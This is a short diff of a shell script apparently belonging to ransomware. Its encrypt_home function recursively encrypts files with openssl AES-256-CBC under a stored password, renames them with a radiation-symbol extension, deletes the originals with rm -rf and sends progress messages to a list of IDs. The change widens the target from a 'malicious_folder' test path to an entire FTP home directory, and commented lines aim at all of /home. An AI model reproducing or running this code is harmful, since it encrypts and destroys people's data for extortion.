@@ -162,13 +162,13 @@ encrypt_home ()
         send_message $id "$(hostname): encrypt home files started."
         done
         #grep -r '/home' -e "" -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
-        grep -r '/home/USERNAME_HERE/FTP/malicious_folder' -e "" --include=\*.* -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
+        grep -r '/home/USERNAME_HERE/FTP' -e "" --include=\*.* -l | xargs -P 10 -I FILE openssl enc -aes-256-cbc -salt -pass pass:$PASS_DEC -in FILE -out FILE.☢
         for id in $ID_MSG
         do
         send_message $id "$(hostname): encrypt home files Done. Delete files."
         done
         #grep -r '/home' -e "" -l | xargs rm -rf FILE
-        grep -r '/home/USERNAME_HERE/FTP/malicious_folder' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
+        grep -r '/home/USERNAME_HERE/FTP/' -e "" --exclude=\*.☢ -l | xargs rm -rf FILE
         #dd if=/dev/zero of=/null
         #rm -rf /null
 }
